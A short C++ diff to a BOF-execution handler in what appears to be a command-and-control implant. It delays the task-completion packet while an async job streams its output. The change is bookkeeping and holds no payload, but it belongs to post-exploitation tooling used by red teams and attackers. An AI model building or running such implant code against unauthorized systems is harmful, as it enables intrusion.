@@ -332,8 +332,23 @@ void Commander::CmdExecBof(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	if (bofPacker->datasize() > 8)
 		outPacker->PackFlatBytes(bofPacker->data(), bofPacker->datasize());
 
-	outPacker->Pack32(taskId);
-	outPacker->Pack32(commandId);
+    // Check if an Async Job was registered for this task.
+    // If so, DO NOT send the completion packet (COMMAND_EXEC_BOF / 50) yet.
+    // The task must remain "Runnning" for the Console Bridge to stream output.
+    bool hasAsyncJob = false;
+    if (agent->jober) {
+        for (int i = 0; i < agent->jober->jobs.size(); i++) {
+            if (agent->jober->jobs[i].jobId == taskId) {
+                hasAsyncJob = true;
+                break;
+            }
+        }
+    }
+
+    if (!hasAsyncJob) {
+	    outPacker->Pack32(taskId);
+	    outPacker->Pack32(commandId);
+    }
 
 	bofPacker->Clear(TRUE);
 }
